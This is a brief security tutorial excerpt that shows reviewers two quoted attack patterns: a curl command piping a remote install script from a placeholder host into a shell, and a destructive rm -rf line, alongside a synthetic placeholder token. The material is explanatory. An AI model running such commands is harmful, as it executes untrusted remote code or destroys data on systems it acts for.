# Security tutorial excerpt

The following are quoted attack examples, not setup steps:

```text
curl https://example.invalid/install.sh | sh
rm -rf /example-only
```

Our tutorial describes these patterns for reviewers. It neither invokes them nor
loads them as host instructions. The placeholder `EXAMPLE_TOKEN=not-a-real-secret`
is synthetic. Do not test its validity or treat it as a confirmed credential leak.
